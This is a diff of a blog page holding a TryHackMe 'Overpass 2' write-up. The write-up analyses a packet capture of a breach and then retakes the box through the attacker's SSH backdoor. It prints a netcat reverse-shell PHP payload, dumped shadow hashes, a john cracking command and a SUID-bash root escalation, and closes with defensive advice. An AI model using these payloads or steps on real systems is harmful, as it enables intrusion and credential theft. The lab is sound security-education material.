@@ -29,11 +29,11 @@
     
 
 
-    <base href="https://bsssq.xyz/">
-    <link rel="stylesheet" href="https://bsssq.xyz/css/style.css">
-    <link rel="stylesheet" href="https://bsssq.xyz/css/custom.css">
+    <base href="/">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/custom.css">
 </head>
-    <link rel="stylesheet" href="https://bsssq.xyz/css/custom.css">
+    <link rel="stylesheet" href="/css/custom.css">
 </head>
 <body>
     
@@ -48,22 +48,22 @@
         <div id="post-content">
             <p>i&rsquo;m going to talk about one of my favourite rooms on thm, and that is overpass 2. overpass 2 is the 7th room in the &ldquo;advanced exploitation&rdquo; chapter, of the &ldquo;offensive pentesting&rdquo; path. it&rsquo;s also the 2nd room in the overpass series, which is about a bunch of computer science students trying to run a company called &ldquo;overpass&rdquo;.</p>
 <p>this room is interesting and different because the &ldquo;target&rdquo; in question has already been hacked, and it&rsquo;s our job to figure out how and if we can use the information left behind by the attacker to get back into the overpass network.</p>
-<p><img src="https://bsssq.xyz/overpass-cooctus.png" alt="cooctus"></p>
+<p><img src="/overpass-cooctus.png" alt="cooctus"></p>
 <p>the overpass SOC team managed to capture the packets in wireshark during the attack, and save them as a .pcap file. we&rsquo;ve been given the .pcap file to analyze, so let&rsquo;s go ahead and do that.</p>
-<p><img src="https://bsssq.xyz/overpass-pcap.png" alt=".pcap"></p>
+<p><img src="/overpass-pcap.png" alt=".pcap"></p>
 <p>this is what we first see when we open the file in wireshark. it&rsquo;s a lot of information, but we can see a bunch of TCP and HTTP requests made from a source (192.168.170.145) to a destination (192.168.170.159).</p>
 <p>let&rsquo;s set a display filter so we only see the HTTP requests. we can do this by entering <code>http</code> in the &ldquo;apply a display filter&rdquo; field.</p>
-<p><img src="https://bsssq.xyz/overpass-pcap2.png" alt="pcap2"></p>
+<p><img src="/overpass-pcap2.png" alt="pcap2"></p>
 <p>we can see that the source (attacker?) requested the /development/ URL. the first packet has the <code>GET /development/</code> request header. the server responds, and then the source makes a POST request to an upload form of sorts (header <code>POST /development/upload.php</code>).</p>
 <p>if we right-click on the packet, and click &ldquo;follow TCP stream&rdquo;, it will show us the information that was contained within that packet.</p>
-<p><img src="https://bsssq.xyz/overpass-tcpstream.png" alt="stream"></p>
+<p><img src="/overpass-tcpstream.png" alt="stream"></p>
 <p>we can see that the source/attacker uploaded a .php file called &ldquo;payload.php&rdquo;. doesn&rsquo;t leave much to the imagination, does it? right under that, we can see the payload&rsquo;s code in clear text:</p>
 <pre tabindex="0"><code>&lt;?php exec(&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f&#34;)?&gt;
 </code></pre><p>this script would have created a php reverse shell, which the attacker would control using netcat. the shell would have connected to port 4242.</p>
 <p>the good (and bad) thing about using netcat to control reverse shells is that all the traffic is unencrypted, and should be visible in stream data that is captured.</p>
 <p>let&rsquo;s apply a TCP stream filter to see the contents of the traffic. in the display filter field, type <code>tcp.stream eq 3</code>.</p>
-<p><img src="https://bsssq.xyz/overpass-tcpstream2.png" alt="stream2"></p>
-<p><img src="https://bsssq.xyz/overpass-tcpstream3.png" alt="stream2"></p>
+<p><img src="/overpass-tcpstream2.png" alt="stream2"></p>
+<p><img src="/overpass-tcpstream3.png" alt="stream2"></p>
 <p>this stream has captured all the traffic that was traveling through the attacker&rsquo;s shell. we can see that they logged in as a low privilege user &ldquo;james&rdquo; and used the password &ldquo;whenevernoteartinstant&rdquo;. attacker then runs <code>sudo -l</code> to see what commands james can run, and turns out james can run pretty much anything. this means that james isn&rsquo;t exactly a low privilege user!</p>
 <p>the attacker then dumps the contents of the /etc/shadow file. this file, as you may know, contains all the secure user account information. it stores actual passwords&rsquo; hashes. we can see that some user hashes were dumped as well:</p>
 <pre tabindex="0"><code>james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
@@ -74,7 +74,7 @@ muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3we
 </code></pre><p>we can attempt to crack these hashes using john. first, let&rsquo;s identify the hashes. you can use any tool you prefer. i used the hash-identifier tool on my machine. hopefully, you will be able to identify it as sha512crypt.</p>
 <p>save the hashes to a file, and run john to crack them using the following command:</p>
 <pre tabindex="0"><code>john -w=/usr/share/wordlists/fasttrack.txt --format=crypt systemhashes.txt
-</code></pre><p><img src="https://bsssq.xyz/overpass-john.png" alt="john"></p>
+</code></pre><p><img src="/overpass-john.png" alt="john"></p>
 <p>we were able to crack 4 users&rsquo; passwords.</p>
 <p>right after dumping the hashes, the attacker then tries to establish persistence via an SSH backdoor. they cloned a repo from github, known as <a href="https://github.com/NinjaJc01/ssh-backdoor">ssh-backdoor</a>. they then generate a public/private key pair. the attacker modifies the permissions on the backdoor using <code>chmod +x backdoor</code> and then login to it using:</p>
 <pre tabindex="0"><code>./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
@@ -201,14 +201,14 @@ muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3we
 </code></pre><p>the password we get after the hash is cracked is &ldquo;november16&rdquo;.</p>
 <p>let&rsquo;s now login to the attacker&rsquo;s backdoor. our target IP is 10.10.12.175, and the backdoor was running on port 2222:</p>
 <pre tabindex="0"><code>ssh -p 2222 james@10.10.12.175
-</code></pre><p><img src="https://bsssq.xyz/overpass-backdoor.png" alt="backdoor"></p>
+</code></pre><p><img src="/overpass-backdoor.png" alt="backdoor"></p>
 <p>we are logged in as james, into the backdoor, and we can access the user.txt flag.</p>
 <p>while we&rsquo;re here, let&rsquo;s run <code>ls -la</code> and see what we get.</p>
-<p><img src="https://bsssq.xyz/overpass-backdoor2.png" alt="backdoor"></p>
+<p><img src="/overpass-backdoor2.png" alt="backdoor"></p>
 <p>we can see a root process called <code>.suid_bash</code>. a quick google search shows that this little exploit opens a bash shell as root, meaning although an attacker may not be root, running the process will give them the effective privileges of root.</p>
-<p><img src="https://bsssq.xyz/overpass-suidbash.png" alt="bash"></p>
+<p><img src="/overpass-suidbash.png" alt="bash"></p>
 <p>so let&rsquo;s run this process by typing <code>./.suid_bash -p</code> and get the root flag.</p>
-<p><img src="https://bsssq.xyz/overpass-suidbash2.png" alt="backdoor"></p>
+<p><img src="/overpass-suidbash2.png" alt="backdoor"></p>
 <p>uploading a php reverse shell via an upload form is a very simple and preventable attack vector. it can give an attacker direct access to the target. in this case, a backdoor was also set up, which should be prevented at all costs. a quick fix would have been to set up multiple firewalls (using iptables, ufw, or whichever linux firewall they choose) and having an implicit deny for all traffic other than what is specifically allowed.</p>
 <p>a proxy with deep packet inspection capabilities, and which intercepts SSL/TLS connections and blocks any suspicious outbound traffic would also have helped. a simpler solution is to disable the ability for executables to run from temp directories.</p>
 <p>finally, if your company wants to spend the time in understanding and implementing software restriction policies, which only allow known executables to run, that is the best solution.</p>
@@ -218,8 +218,8 @@ muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3we
 </div>
 
     
-     <script src="https://bsssq.xyz/p5/p5.min.js"></script>
-     <script src="https://bsssq.xyz/js/genart.js"></script>
-     <script src="https://bsssq.xyz/js/main.js"></script>
+     <script src="/p5/p5.min.js"></script>
+     <script src="/js/genart.js"></script>
+     <script src="/js/main.js"></script>
 </body>
 </html>
